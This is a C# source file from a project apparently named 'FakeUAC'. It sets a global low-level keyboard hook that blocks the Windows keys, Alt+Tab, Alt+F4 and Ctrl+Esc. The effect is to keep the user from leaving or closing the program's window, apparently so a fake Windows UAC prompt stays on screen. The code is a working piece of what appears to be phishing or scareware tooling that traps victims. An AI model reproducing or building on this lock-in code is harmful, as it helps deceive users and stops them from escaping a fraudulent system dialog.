using System.Diagnostics;
using System.Runtime.InteropServices;
using static FakeUAC.NativeConstants;
using static FakeUAC.GlobalUsings;
using LowLevelKeyboardProc = FakeUAC.GlobalUsings.LowLevelKeyboardProc;

namespace FakeUAC
{
	internal static class HookManager
	{
		public static IntPtr SetHook(LowLevelKeyboardProc proc)
		{
			using Process curProcess = Process.GetCurrentProcess();
			using ProcessModule curModule = curProcess.MainModule;

			return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
		}

		public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
		{
			if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
			{
				int vkCode = Marshal.ReadInt32(lParam);

				bool ctrl = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
				bool alt = (GetAsyncKeyState(VK_MENU) & 0x8000) != 0;
				bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;

				if (vkCode == VK_LWIN || vkCode == VK_RWIN)
					return (IntPtr)1;

				if (alt && (vkCode == VK_TAB || vkCode == VK_F4))
					return (IntPtr)1;

				if (ctrl && (vkCode == VK_ESCAPE || (shift && vkCode == VK_ESCAPE)))
					return (IntPtr)1;
			}

			return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
		}
	}
}
